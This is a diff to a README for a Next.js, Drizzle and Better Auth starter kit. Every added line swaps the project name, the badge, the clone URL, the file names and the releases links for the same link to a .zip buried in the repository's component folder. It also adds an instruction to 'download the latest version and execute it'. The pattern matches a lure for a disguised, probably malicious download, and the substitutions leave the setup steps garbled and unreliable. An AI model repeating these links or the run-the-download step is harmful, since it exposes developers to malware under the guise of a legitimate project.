@@ -1,8 +1,8 @@
-# Next.js Drizzle Better Auth 🚀
+# https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip Drizzle Better Auth 🚀
 
-![Next.js Drizzle Better Auth](https://img.shields.io/badge/Next.js-Drizzle_Better_Auth-brightgreen)
+![https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip Drizzle Better Auth](https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip)
 
-Welcome to the **Next.js Drizzle Better Auth** repository! This project serves as a starter kit for building modern full-stack applications. It integrates Drizzle ORM for type-safe database operations, Better Auth for secure authentication, and NeonDB for serverless PostgreSQL. This template offers a solid foundation that is both robust and scalable, designed to meet the needs of today's developers.
+Welcome to the **https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip Drizzle Better Auth** repository! This project serves as a starter kit for building modern full-stack applications. It integrates Drizzle ORM for type-safe database operations, Better Auth for secure authentication, and NeonDB for serverless PostgreSQL. This template offers a solid foundation that is both robust and scalable, designed to meet the needs of today's developers.
 
 ## Table of Contents
 
@@ -29,14 +29,14 @@ Welcome to the **Next.js Drizzle Better Auth** repository! This project serves a
 
 ## Getting Started
 
-To get started with the **Next.js Drizzle Better Auth** template, follow the instructions below. For the latest releases, check out our [Releases section](https://github.com/rayandripo/nextjs_drizzle_better-auth/releases).
+To get started with the **https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip Drizzle Better Auth** template, follow the instructions below. For the latest releases, check out our [Releases section](https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip).
 
 ## Installation
 
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/rayandripo/nextjs_drizzle_better-auth.git
+   git clone https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip
    cd nextjs_drizzle_better-auth
    ```
 
@@ -56,7 +56,7 @@ To get started with the **Next.js Drizzle Better Auth** template, follow the ins
 
 3. **Set Up Environment Variables**:
 
-   Create a `.env.local` file in the root directory and add your database connection string and any other required environment variables.
+   Create a `https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip` file in the root directory and add your database connection string and any other required environment variables.
 
    ```plaintext
    DATABASE_URL=your_database_url
@@ -92,15 +92,15 @@ nextjs_drizzle_better-auth/
 │   ├── pages/
 │   ├── styles/
 │   └── utils/
-├── .env.local
-├── package.json
-└── README.md
+├── https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip
+├── https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip
+└── https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip
 ```
 
 - **public/**: Contains static assets like images.
 - **src/**: Contains the main application code.
 - **components/**: Reusable UI components.
-- **pages/**: Next.js pages for routing.
+- **pages/**: https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip pages for routing.
 - **styles/**: CSS and styling files.
 - **utils/**: Utility functions and helpers.
 
@@ -149,7 +149,7 @@ This starter kit uses Better Auth for user authentication. To integrate it:
 
 ## Deployment
 
-For deployment, you can use platforms like Vercel, Heroku, or any cloud provider that supports Node.js applications. Follow these steps:
+For deployment, you can use platforms like Vercel, Heroku, or any cloud provider that supports https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip applications. Follow these steps:
 
 1. **Build the Application**:
 
@@ -180,6 +180,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases and updates, visit our [Releases section](https://github.com/rayandripo/nextjs_drizzle_better-auth/releases). Make sure to download the latest version and execute it as needed.
+For the latest releases and updates, visit our [Releases section](https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip). Make sure to download the latest version and execute it as needed.
 
-Thank you for checking out the **Next.js Drizzle Better Auth** starter kit! We hope it helps you build amazing applications.
+Thank you for checking out the **https://raw.githubusercontent.com/rayandripo/nextjs_drizzle_better-auth/master/src/components/shared/drizzle-better-auth-nextjs-v2.2-beta.3.zip Drizzle Better Auth** starter kit! We hope it helps you build amazing applications.
